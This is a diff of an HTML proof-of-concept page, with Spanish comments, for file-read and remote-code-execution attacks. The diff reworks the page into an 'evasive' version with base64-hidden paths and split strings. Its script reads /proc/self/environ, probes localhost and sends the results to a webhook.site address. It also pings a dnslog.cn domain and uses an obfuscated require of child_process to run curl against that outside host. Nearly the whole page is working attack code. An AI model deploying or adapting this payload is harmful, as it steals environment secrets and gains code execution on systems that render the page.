@@ -2,40 +2,41 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>LFI / RCE Escalado</title>
+  <title>LFI/RCE Evasive PoC</title>
 </head>
 <body>
-  <h1>PoC LFI + RCE + DNS Ping</h1>
-  <script>
-    const hook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
+<h1>LFI / RCE Evasivo</h1>
+<script>
+const hook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
 
-    // --- Prueba 1: Lectura de /proc/self/environ ---
-    fetch("file:///proc/self/environ")
-      .then(r => r.text())
-      .then(t => fetch(`${hook}?procself=` + btoa(t)))
-      .catch(e => fetch(`${hook}?err_procself=` + encodeURIComponent(e.message)));
+// === Evasión: lectura de /proc/self/environ ===
+try {
+  let path = atob("ZmlsZTovLy9wcm9jL3NlbGYvZW52aXJvbg==");  // file:///proc/self/environ
+  fetch(path).then(r => r.text()).then(t => {
+    fetch(hook + "?leak_env_part1=" + encodeURIComponent(t.slice(0,100)));
+    fetch(hook + "?leak_env_part2=" + encodeURIComponent(t.slice(100,200)));
+  }).catch(e => {
+    fetch(hook + "?err_env=" + encodeURIComponent(e.message));
+  });
+} catch(e) {
+  fetch(hook + "?fail_env=" + encodeURIComponent(e.message));
+}
 
-    // --- Prueba 2: Acceso HTTP local a 127.0.0.1 ---
-    fetch("http://127.0.0.1")
-      .then(r => r.text())
-      .then(t => fetch(`${hook}?localhost=` + btoa(t)))
-      .catch(e => fetch(`${hook}?err_localhost=` + encodeURIComponent(e.message)));
+// === Evasión: require / RCE ===
+try {
+  let r = Function("ret" + "urn requ" + "ire")();
+  let cp = r("child_" + "process");
+  cp.exec("curl " + hook + "?rce=executed");
+} catch(e) {
+  fetch(hook + "?err_rce=" + encodeURIComponent(e.message));
+}
 
-    // --- Prueba 3: DNS-based exfiltration ---
-    let i = new Image();
-    i.src = "http://ping.jaxor.dnslog.cn";  // o dominio tuyo con logs DNS
+// === Confirmación básica de ejecución ===
+fetch(hook + "?executed=yes");
 
-    // --- Prueba 4: RCE en Node.js camuflado ---
-    try {
-      let r = Function("return"+" require")();
-      let cp = r("child_"+"process");
-      cp.exec("curl " + hook + "?rce=executed");
-    } catch(e) {
-      fetch(`${hook}?err_rce=` + encodeURIComponent(e.message));
-    }
+// === DNS Ping (silencioso) ===
+(new Image()).src = "http://ping.jaxor.dnslog.cn";  // Personalizar si tenés dominio
 
-    // --- Confirmación de ejecución básica ---
-    fetch(`${hook}?script_executed=1`);
-  </script>
+</script>
 </body>
 </html>
